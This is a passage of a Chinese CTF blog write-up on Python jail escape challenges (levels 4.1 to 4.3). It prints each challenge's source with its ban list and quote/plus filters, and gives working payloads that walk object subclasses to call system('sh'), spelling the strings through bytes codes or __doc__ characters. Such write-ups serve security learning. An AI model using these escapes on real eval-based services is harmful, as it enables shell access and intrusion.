class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;locals&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;bytes&#x27;</span>]</span><br><span class="line"></span><br><span class="line">my_eval_func_ABDC8732 = <span class="built_in">eval</span></span><br><span class="line">my_input_func_001EC9GP = <span class="built_in">input</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _  __</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || |/_ |</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_| |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| |</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_| |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)_|</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                        </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and `,\&quot;,&#x27; Good luck!&quot;</span>)</span><br><span class="line">input_data = my_input_func_001EC9GP(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_eval_func_ABDC8732(input_data)))</span><br></pre></td></tr></table></figure>
<p>如果bytes被删掉了，其实还可以利用Show subclasses with tuple找到<code>bytes</code>类：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
<p>找到里面的<code>&lt;class 'bytes'&gt;</code>，修改之前的payload，将payload改成Show subclasses with tuple表达的形式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode()](().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>, <span class="number">104</span>]).decode())</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level4-2">calc_jail_beginner_level4.2</h4>
<p>So cool that u finished the 4.1 challenge</p>
<p>filter + try again!!!</p>
<p>还是没有源码：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let&#x27;s have an beginner jail of calc</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br><span class="line">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,&quot;,&#x27;,+ Good luck!</span><br></pre></td></tr></table></figure>
<p>这题试了一下<code>__doc__</code>拼接的方法，并没有成功，测试了一下好像是<code>+</code>被拿下了，python还提供了一个<code>join()</code>方法用来连接字符串，之前也用过，所以直接拿来改payload：</p>
<blockquote>
<p><code>join()</code>常用的方法就是<code>''.join(['1','2','3','4']) == '1234'</code>，这里由于引号被ban了，可以直接使用<code>str().join()</code>来代替。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">86</span>],().__doc__[<span class="number">19</span>],().__doc__[<span class="number">4</span>],().__doc__[<span class="number">17</span>],().__doc__[<span class="number">10</span>]])](<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">56</span>]]))</span><br></pre></td></tr></table></figure>
<p>获取了源码发现确实是ban掉了加号：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#No danger function,no chr,Try to hack me!!!!</span></span><br><span class="line"><span class="comment">#Try to read file ./flag</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;locals&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;bytes&#x27;</span>]</span><br><span class="line"></span><br><span class="line">my_eval_func_00EFCDB = <span class="built_in">eval</span></span><br><span class="line">my_input_func_00FDCAB = <span class="built_in">input</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`+&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _   ___</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || | |__ \</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_   ) |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _| / /</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ / /_</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____|</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,\&quot;,&#x27;,+ Good luck!&quot;</span>)</span><br><span class="line">input_data = my_input_func_00FDCAB(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_eval_func_00EFCDB(input_data)))</span><br></pre></td></tr></table></figure>
<p>事实上，这题也可以用4.1里的bytes那种方法，所以也可以这样：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode()](().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>, <span class="number">104</span>]).decode())</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level4-3">calc_jail_beginner_level4.3</h4>
<p>So cool that u finished the 4.1 challenge</p>
<p>filter +++ try again!!!</p>
<p>没有附件：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the python jail</span><br><span class="line">Let&#x27;s have an beginner jail of calc</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br><span class="line">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and `,&quot;,&#x27;,+ Good luck!</span><br></pre></td></tr></table></figure>
<p>试试前几关的payload，首先是用bytes改写，成功：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode()](().__class__.__base__.__subclasses__()[<span class="number">6</span>]([<span class="number">115</span>, <span class="number">104</span>]).decode())</span><br></pre></td></tr></table></figure>
<p>看看源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">BANLIST = [<span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;locals&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;bytes&#x27;</span>,<span class="string">&#x27;type&#x27;</span>,<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">my_eval_func_002EFCDB = <span class="built_in">eval</span></span><br><span class="line">my_input_func_000FDCAB = <span class="built_in">input</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BANLIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __loader__, __builtins__</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">s</span>):</span><br><span class="line">    not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;\&#x27;`+&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _   ____</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || | |___ \</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_  __) |</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _||__ &lt;</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |_ ___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_(_)____/</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and `,\&quot;,&#x27;,+ Good luck!&quot;</span>)</span><br><span class="line">    input_data = my_input_func_000FDCAB(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">filter</span>(input_data):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(my_eval_func_002EFCDB(input_data)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>再来试试join，也成功：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">4</span>].__init__.__globals__[<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">86</span>],().__doc__[<span class="number">19</span>],().__doc__[<span class="number">4</span>],().__doc__[<span class="number">17</span>],().__doc__[<span class="number">10</span>]])](<span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">56</span>]]))</span><br></pre></td></tr></table></figure>

                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Misc/">Misc</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/post/2024zjctfcs/"
                                   title="2024 浙江省赛初赛 Misc方向 全WriteUp"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">2024 浙江省赛初赛 Misc方向 全WriteUp</span>
                                        <span class="post-nav-item">上一篇</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/post/2024qwnt/"
                                   title="2024强网拟态Misc方向部分 WriteUp"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">2024强网拟态Misc方向部分 WriteUp</span>
                                        <span class="post-nav-item">下一篇</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    


    <div class="comments-container border-box">
        <div id="comments-anchor" class="comment-area-title border-box">
            <i class="fas fa-comments"></i>&nbsp;评论
        </div>
        <div class="comment-plugin-fail border-box">
    <span class="fail-tip">评论插件加载失败</span>
    <button class="reload keep-button">点击重新加载</button>
</div>
<div class="comment-plugin-loading flex-center border-box">
    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
    <span class="load-tip">正在加载评论插件</span>
</div>
<script data-pjax>
  window.KeepCommentPlugin = {}
  window.KeepCommentPlugin.hideLoading = () => {
    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
    cplDom.style.display = 'none'
  }
  window.KeepCommentPlugin.loadFailHandle = () => {
    window.KeepCommentPlugin.hideLoading()
    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
    cpfDom.style.display = 'flex'
    cpfDom.querySelector('.reload').addEventListener('click', () => {
      window.location.reload()
    })
  }
</script>

        
            

    <div class="waline-comment-container">
        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline.css"/>
        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline-meta.css"/>
        <div id="waline-comment"></div>
        <script data-pjax>
          window.KeepCommentPlugin.walineOptions = JSON.parse('{}'.replace(/&#34;/g, '"'))
          window.KeepCommentPlugin.walineOptions.el = '#waline-comment'
          window.KeepCommentPlugin.walineOptions.comment = '.post-comments-count'
          window.KeepCommentPlugin.walineOptions.serverURL = 'https://blog-waline-weld.vercel.app/'
          window.KeepCommentPlugin.walineOptions.lang = 'zh-CN' || 'zh-CN'
          window.KeepCommentPlugin.walineOptions.reaction = 'false' === 'true'
        </script>

        

        
            <script 
                    async
                    type="module"
            >
              import { init } from '//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline.js'
              window.KeepCommentPlugin.initWaline = () => {
                if (init) {
                  init(window.KeepCommentPlugin.walineOptions)
                  window.KeepCommentPlugin.hideLoading()
                } else {
                  setTimeout(() => {
                    window.KeepCommentPlugin.initWaline()
                  }, 1000)
                }
              }

              if ('false' === 'true') {
                setTimeout(() => {
                  window.KeepCommentPlugin.initWaline()
                }, 1200)
              } else {
                window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initWaline)
              }
            </script>
        
    </div>


        
    </div>





                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFPyjail"><span class="nav-text">什么是Pyjail</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pyjail%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="nav-text">Pyjail的实现原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">Python魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Pyjail%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">Pyjail中常用的魔术方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Pyjail%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%87%BD%E6%95%B0%E5%92%8C%E6%A8%A1%E5%9D%97"><span class="nav-text">Pyjail中常用的函数和模块</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#import-%E5%87%BD%E6%95%B0"><span class="nav-text">import 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#exec-eval-%E5%87%BD%E6%95%B0"><span class="nav-text">exec &amp; eval 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#execfile-%E5%87%BD%E6%95%B0"><span class="nav-text">execfile 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#timeit-%E5%87%BD%E6%95%B0-from-timeit-%E6%A8%A1%E5%9D%97"><span class="nav-text">timeit 函数 from timeit 模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#platform-%E6%A8%A1%E5%9D%97"><span class="nav-text">platform 模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#commands-%E6%A8%A1%E5%9D%97"><span class="nav-text">commands 模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#subprocess%E6%A8%A1%E5%9D%97"><span class="nav-text">subprocess模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#compile-%E5%87%BD%E6%95%B0"><span class="nav-text">compile 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#fstring%EF%BC%88f%E4%BF%AE%E9%A5%B0%E7%AC%A6-py-3-6%EF%BC%89"><span class="nav-text">fstring（f修饰符 py&gt;3.6）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#file-%E5%87%BD%E6%95%B0"><span class="nav-text">file 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#open-%E5%87%BD%E6%95%B0"><span class="nav-text">open 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#codecs%E6%A8%A1%E5%9D%97"><span class="nav-text">codecs模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Filetype-%E5%87%BD%E6%95%B0-from-types-%E6%A8%A1%E5%9D%97"><span class="nav-text">Filetype 函数 from types 模块</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E5%8A%A0%E6%B7%B1%E5%85%A5%E7%9A%84%E7%90%86%E8%A7%A3Python%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">更加深入的理解Python魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pyjail%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-text">Pyjail绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E8%81%94%E5%87%BD%E6%95%B0decode"><span class="nav-text">内联函数decode</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins%E5%87%BD%E6%95%B0"><span class="nav-text">builtins函数 </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E5%BC%95%E5%85%A5os%E7%AD%89%E6%A8%A1%E5%9D%97"><span class="nav-text">路径引入os等模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#reload%E6%A8%A1%E5%9D%97"><span class="nav-text">reload模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%90%8D%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%AB%E6%8F%8F%E8%BF%87%E6%BB%A4%E7%9A%84%E7%BB%95%E8%BF%87-%E9%80%9A%E8%BF%87getattr-%E6%9D%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C"><span class="nav-text">函数名字符串扫描过滤的绕过(通过getattr()来字符串操作)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%81%A2%E5%A4%8D-sys-modules"><span class="nav-text">恢复 sys.modules</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E7%BB%A7%E6%89%BF%E9%93%BE%E8%8E%B7%E5%8F%96%EF%BC%88object%E7%B1%BB%EF%BC%89"><span class="nav-text">基于继承链获取（object类）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="nav-text">字符串拼接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base64-%E5%8F%98%E5%BD%A2"><span class="nav-text">base64 变形</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%86%E5%BA%8F"><span class="nav-text">逆序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="nav-text">进制转换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%B1%9E%E6%80%A7%E5%90%8D%E6%88%96%E8%80%85%E5%87%BD%E6%95%B0%E5%90%8D%EF%BC%9A"><span class="nav-text">过滤了属性名或者函数名：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getattr-%E5%87%BD%E6%95%B0"><span class="nav-text">getattr 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getattribute-%E5%87%BD%E6%95%B0"><span class="nav-text">__getattribute__ 函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#globals-%E6%9B%BF%E6%8D%A2"><span class="nav-text">_globals_ 替换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-import"><span class="nav-text">过滤 import</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#loader-load-module"><span class="nav-text">__loader__.load_module</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-text">[]绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B0%83%E7%94%A8-getitem-%E5%87%BD%E6%95%B0%E7%9B%B4%E6%8E%A5%E6%9B%BF%E6%8D%A2%EF%BC%9B"><span class="nav-text">调用__getitem__()函数直接替换；</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#getitem-%E6%9B%BF%E6%8D%A2%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="nav-text">getitem()替换中括号[]</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#pop-%E6%9B%BF%E6%8D%A2%E4%B8%AD%E6%8B%AC%E5%8F%B7-%EF%BC%8C%E7%BB%93%E5%90%88-getitem-%E5%88%A9%E7%94%A8"><span class="nav-text">pop()替换中括号[]，结合__getitem__()利用</span></a></li></ol></li><li class="nav-item nav-level-4"><a 